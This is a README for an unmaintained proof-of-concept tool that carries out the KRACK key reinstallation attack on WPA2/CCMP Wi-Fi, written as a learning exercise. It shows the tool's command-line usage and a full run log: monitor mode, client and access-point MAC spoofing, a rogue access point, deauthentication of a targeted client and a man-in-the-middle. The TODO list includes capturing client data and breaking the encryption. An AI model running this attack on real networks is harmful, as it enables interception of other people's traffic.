# [NO SUPPORT] PoC Krack (Key Reinstallation AttaCKs)

**PLEASE READ** : I have no intention to update or maintain this code. Feel free to use and modify it, but I won't answer to any comment/issue anymore. This project was difficult, I learnt what I wanted to learn, and developed what I wanted to develop, a quick-one-win to validate my comprehension of the vulnerability.

Proof of concept for Krack attack using channel-based MitM

## Theory

French article on [hackndo](http://beta.hackndo.com/krack/)

## Environment

WPA2 with CCMP

## Usage

```
# ./Krack.py -h
usage: Krack.py [-h] [-d] -a ACCESS_POINT -i IFACE_AP -b CLIENT -j
                IFACE_CLIENT -c CHANNEL

optional arguments:
  -h, --help            show this help message and exit
  -d, --direct          Skip channel and monitor settings
  -a ACCESS_POINT, --access_point ACCESS_POINT
                        Enter the SSID of the specific access point to target
  -i IFACE_AP, --iface_ap IFACE_AP
                        Enter the SSID of the specific access point to target
  -b CLIENT, --client CLIENT
                        Enter the MAC address of the specific client to target
  -j IFACE_CLIENT, --iface_client IFACE_CLIENT
                        Enter the SSID of the specific access point to target
  -c CHANNEL, --channel CHANNEL
                        Choose channel on which the targeted access point is
                        listening on

# ./Krack.py -a hackndo_ssid_test -i wlan1 -b "ab:cd:0a:0b:11:22" -j wlan0 -c 11
[*] Turning off both interfaces
[*] Setting interface wlan1 on channel 11
[*] Interface wlan1 is on channel 11
[*] Setting interface wlan0 on channel 4
[*] Interface wlan0 is on channel 4
[*] Starting monitor mode for wlan1
[*] Interface wlan1 is now in monitor mode
[*] Starting monitor mode for wlan0
[*] Interface wlan0 is now in monitor mode
[*] Turning on both interfaces
[*] Trying to find hackndo_ssid_test MAC address
[*] MAC Found ! 0e:cc:46:8a:b1:09
[*] Jammer initialized correctly
[*] Sniffing an AP Beacon...
[*] AP Beacon saved!
[*] Sniffing an AP Probe response...
[*] AP Probe response saved!
[*] Updating wlan1 MAC address to ab:cd:0a:0b:11:22 (Client MAC)
[*] wlan1 MAC address update successful
[*] Updating wlan0 MAC address to 0e:cc:46:8a:b1:09 (Real AP MAC)
[*] wlan0 MAC address update successful
[*] Rogue AP started. Sending beacons...
[*] Running main loop
[*] Starting deauth on AP 0e:cc:46:8a:b1:09 (hackndo_ssid_test) and client ab:cd:0a:0b:11:22...
[*] Probe request to our AP
[*] Client authenticated to our AP!
[*] MitM attack has started
[*] Deauth stopped
```

## TODO

- [X] Use CSA (Channel Switch Announcement) to make client switch channel after deauth (See issue [#1](https://github.com/Hackndo/krack-poc/issues/1))
- [ ] Save data sent by client
- [ ] Break cryptography with known plain text when counter is reinitialized
